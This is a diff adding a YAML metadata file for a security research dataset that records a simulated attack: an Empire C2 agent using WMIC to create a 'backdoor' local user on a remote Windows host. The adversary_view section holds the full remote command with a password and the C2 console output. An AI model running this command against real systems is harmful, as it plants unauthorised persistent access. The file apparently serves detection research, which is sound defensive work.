@@ -1,0 +1,39 @@
+title: WMIC Add User Backdoor
+id: SD-190518231333
+author: Roberto Rodriguez @Cyb3rWard0g
+creation_date: 19/05/18
+platform: Windows
+mordor_environment: shire
+simulation_framework:
+  type: C2
+  name: Empire
+permissions_required:
+  - User
+description: This dataset represents adversaries using WMI to add a backdoor user on endpoints remotely
+dataset:
+  type: small
+  file: https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_wmic_add_user.tar.gz
+attack_mappings:
+  - technique: T1047
+    tactics:
+      - TA0002
+      - TA0008
+analytics_validation: 
+adversary_view: |-
+  (Empire: V6W3TH8Y) > shell wmic /node:IT001 process call create "net user /add backdoor pa$$w0rd1"
+  [*] Tasked V6W3TH8Y to run TASK_SHELL
+  [*] Agent V6W3TH8Y tasked with task ID 12
+  (Empire: V6W3TH8Y) > Executing (Win32_Process)->Create()
+
+  Method execution successful.
+
+  Out Parameters:
+  instance of __PARAMETERS
+  {
+    ProcessId = 6580;
+    ReturnValue = 0;
+  };
+
+  ..Command execution completed.
+
+  (Empire: V6W3TH8Y) >
